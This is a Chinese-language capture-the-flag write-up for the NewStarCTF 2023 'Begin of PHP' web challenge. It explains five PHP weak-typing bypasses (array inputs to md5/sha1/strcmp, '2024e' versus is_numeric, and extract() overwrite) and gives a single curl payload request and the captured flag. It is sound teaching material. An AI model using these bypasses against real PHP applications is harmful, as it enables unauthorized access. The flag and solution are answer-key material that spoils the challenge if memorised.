---
title: "[NewStarCTF 2023 公开赛道]Begin of PHP"
ctf: "NewStarCTF 2023"
date: 2026-05-24
category: web
difficulty: easy
points: N/A
flag_format: "flag{...}"
author: "Claude"
---

# [NewStarCTF 2023 公开赛道]Begin of PHP

## Summary

一道 PHP 弱类型比较的多关卡 Web 题，需要依次绕过 5 个 Level：MD5 弱比较碰撞、MD5===SHA1 数组绕过、strcmp 数组绕过、is_numeric 弱类型绕过、extract 变量覆盖。

## Solution

### Step 1: 分析源码

访问页面直接显示源码，共 5 个关卡：

- **Level 1**: `key1 !== key2 && md5(key1) == md5(key2)` — MD5 弱比较，数组绕过
- **Level 2**: `md5(key3) === sha1(key3)` — 数组使两者都返回 NULL，NULL === NULL 为 true
- **Level 3**: `strcmp(key4, file_get_contents("/flag")) == 0` — strcmp 遇数组返回 NULL，NULL == 0 为 true
- **Level 4**: `!is_numeric(key5) && key5 > 2023` — PHP 弱类型，`2024e` 不通过 is_numeric 但比较时转数值
- **Level 5**: `extract($_POST)` + 正则过滤字母数字 + `$flag5` 检查 — 用不含字母数字的值覆盖 `$flag5`

### Step 2: 构造 Payload

```bash
curl -s "http://b3bc0d74-487f-4fec-b516-2238b4b1a5dd.node5.buuoj.cn:81/?key1[]=1&key2[]=2&key4[]=1&key5=2024e" \
  -d "key3[]=" \
  -d "flag5=_"
```

**绕过原理**：
- `key1[]=1&key2[]=2` — 不同数组，md5(array) 都返回 NULL，弱比较相等
- `key3[]=` — POST 数组，md5(array) === sha1(array) 都是 NULL
- `key4[]=1` — strcmp(array, string) 返回 NULL，NULL == 0 为 true
- `key5=2024e` — is_numeric 返回 false（科学计数法带字母），但 `2024e > 2023` 在弱比较时转为数值
- `flag5=_` — extract 将 POST 参数注册为变量，`_` 不含字母数字通过正则，且 `_` 为真值

## Flag

```
flag{37a3b765-c865-420b-a43d-3b0b3388f70d}
```
